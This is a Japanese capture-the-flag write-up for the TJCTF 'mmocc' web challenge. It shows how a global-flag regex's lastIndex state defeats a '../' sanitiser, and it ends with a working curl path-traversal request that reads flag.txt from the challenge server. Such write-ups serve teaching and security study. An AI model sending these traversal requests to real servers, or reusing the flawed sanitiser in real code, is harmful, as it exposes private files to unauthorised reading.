# mmocc:web:XXXXpts
Massively multiplayer online cookie clicker!!  
[mmocc.tjc.tf](https://mmocc.tjc.tf/)  

Downloads  
[index.js](index.js)  

# Solution
サイトにアクセスすると他ユーザと共用のcookieクリッカーがある。  
[site.png](site/site.png)  
不審な点はないため、ソースを見ると以下のようであった。  
```js
~~~
const flag = fs.readFileSync(path.join(__dirname, 'flag.txt')).toString().trim();
~~~
const state = { clicks: 0 };
const routes = {
  clicks: async (_req, res) => {
    if (state.clicks === Infinity) res.json({ flag, ...state });
    else res.json(state);
  },
  click: async (_req, res) => {
    state.clicks++;
    res.end();
  },
  static: async (req, res) => {
    const regex = /\.\.\//g;
    const clean = (path) => {
      const replaced = path.replace('../', '');
      if (regex.test(path)) {
        return clean(replaced);
      }
      return replaced;
    };

    const location = [__dirname, 'static', clean(req.url)];
    if (location[2].endsWith('/')) location.push('index.html');
    const file = path.join(...location);

    let data;
    try {
      data = await fs.promises.readFile(file);
    } catch (e) {
      if (e.code === 'ENOENT') {
        res.statusCode = 404;
        res.end('not found');
        return;
      }
      throw e;
    }

    const type = types.get(path.extname(file)) ?? 'text/plain';
    res.setHeader('content-type', type);
    res.end(data);
  },
};
~~~
```
`/static`にて`clean`といったパストラバーサル対策を行っている。  
実はグローバルフラグを持った正規表現を用いてtestを呼び出すとlastIndexが加算される。  
そして次回のtestはそのlastIndexからのチェックが始まるため、以下のような挙動を引き起こす。  
```bash
$ node
~~~
> const regex = /\.\.\//g;
undefined
> regex.test("../../../../../satoki")
true
> regex.lastIndex
3
> regex.test("../../../../satoki")
true
> regex.lastIndex
6
> regex.test("../../../satoki")
true
> regex.lastIndex
9
> regex.test("../../satoki")
false
> regex.lastIndex
0
```
つまり文字列が変動する場合、正常に検査されない部分が存在することとなる。  
よって以下のように`clean`がバイパスできる。  
```bash
$ node
~~~
> const regex = /\.\.\//g;
undefined
> const clean = (path) => {
...     const replaced = path.replace('../', '');
...     if (regex.test(path)) {
.....         return clean(replaced);
.....     }
...     return replaced;
... };
undefined
> clean("../../../../../satoki")
'../satoki'
```
あとはflag.txtを読み取ればよい。  
以下のように行う。  
```bash
$ curl --path-as-is https://mmocc.tjc.tf/static/../../../../../../flag.txt
tjctf{h0w_h1gh_c4n_w3_g3t}
```
flagが得られた。  

## tjctf{h0w_h1gh_c4n_w3_g3t}